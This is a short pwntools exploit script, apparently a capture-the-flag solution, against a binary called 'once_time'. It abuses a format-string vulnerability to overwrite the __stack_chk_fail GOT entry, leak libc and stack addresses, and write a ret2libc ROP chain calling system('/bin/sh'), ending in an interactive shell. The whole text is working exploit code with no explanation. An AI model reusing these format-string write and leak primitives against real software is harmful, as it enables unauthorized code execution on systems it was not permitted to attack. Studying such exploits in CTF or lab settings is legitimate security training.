from pwn import *
import libnum
p = process("./once_time")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
elf = ELF("./once_time")
offset = 6
#p.sendafter("msg: ","AAAAAAAA"+"%6$016x")
#print p.recv()
# change __stack_chk_fail
def send_payload(payload):
	p.sendafter("name: ","ssss")
	p.sendafter("msg: ",payload)

def change(got_addr,value):
	temp = value&0xffff
	print hex(got_addr)
	print hex(value)
	if temp != 0:
		payload = "%{}c".format(temp) #
	else:
		payload = ""
	payload += "%{}$hn".format(offset+3)
	payload = payload.ljust(0x20-8,"a")
	payload += p64(got_addr) #8
	print payload
	send_payload(payload)

def leak(got_addr):
	payload = "%9$s"
	payload = payload.ljust(0x20-8,"a")
	payload += p64(got_addr)
	send_payload(payload)
	return u64(p.recvuntil("aaaa",drop=True).ljust(8,"\x00"))

main_addr = 0x0000000000400983
stk_chk_fail_got = elf.got["__stack_chk_fail"]
read_got = elf.got["read"]
pop_rdi_ret = 0x0000000000400a83
leave_ret = 0x0000000000400981
context.log_level = "debug"

change(stk_chk_fail_got,main_addr)
read_addr = leak(read_got)
libc.address = read_addr - libc.symbols["read"]
log.success("libc_base:"+hex(libc.address))
system_addr = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
log.success("system_addr:"+hex(system_addr))
log.success("binsh:"+hex(binsh))
ROP_data =  p64(pop_rdi_ret) + p64(binsh) + p64(system_addr)

stack_addr = leak(libc.symbols["environ"])
print hex(stack_addr)
offset2 = 0x7fff11932f78 - 0x7fff11933068
ret_addr = stack_addr + offset2
log.success("ret_addr:"+hex(ret_addr))

gdb.attach(p,"b *0x400981\nb printf")
for i in range(0,len(ROP_data),2):
	change(ret_addr+i,libnum.s2n(ROP_data[i+1:i+2]+ROP_data[i:i+1]))

change(stk_chk_fail_got,leave_ret)

p.interactive()
